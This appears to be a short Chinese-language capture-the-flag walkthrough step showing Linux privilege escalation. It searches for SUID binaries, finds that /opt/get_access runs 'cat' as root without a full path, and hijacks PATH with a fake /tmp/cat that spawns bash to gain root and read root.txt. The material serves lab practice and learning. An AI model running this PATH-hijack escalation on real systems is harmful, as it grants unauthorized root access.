#### 提升权限：

查找有s权限的文件：

find / -perm -u=s -type f 2>/dev/null

\-u=s u代表用户，s代表s权限，u=s就是suid，set user ID

\--> /opt/get\_access

strings /opt/get\_access

\--> 发现有setuid和cat /root/system.info，cat命令会以root权限执行，伪造一个cat来提权：

echo '/bin/bash'>/tmp/cat

chmod +x /tmp/cat

echo $PATH

export PATH=/tmp:$PATH

/opt/get\_access

  

这时已经获取了root权限，切换到root文件夹，使用more命令查看root.txt
